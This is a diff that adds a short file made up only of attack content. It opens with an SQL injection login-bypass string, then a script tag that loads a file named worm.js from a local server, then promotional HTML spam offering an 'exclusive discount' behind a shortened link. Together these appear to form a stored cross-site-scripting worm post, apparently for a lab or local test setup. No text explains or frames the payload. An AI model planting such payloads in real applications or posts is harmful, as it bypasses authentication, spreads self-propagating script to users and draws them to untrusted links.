@@ -1,0 +1,12 @@
+' OR '1'='1' --
+
+<script src="http://127.0.0.1:3000/static/worm.js">
+
+Hey everyone! Just found an <b>exclusive discount</b> on premium subscriptions! 🎉
+
+🚀 <i>Early access to special deals</i><br>
+💰 <b>Save big before it’s gone!</b><br>
+🔗 <a href="https://tinyurl.com/5ckj6jj5" target="_blank">Grab Your Discount!</a>
+
+Hurry, offer expires soon! ⏳ #Deals #Exclusive #SaveBig
+
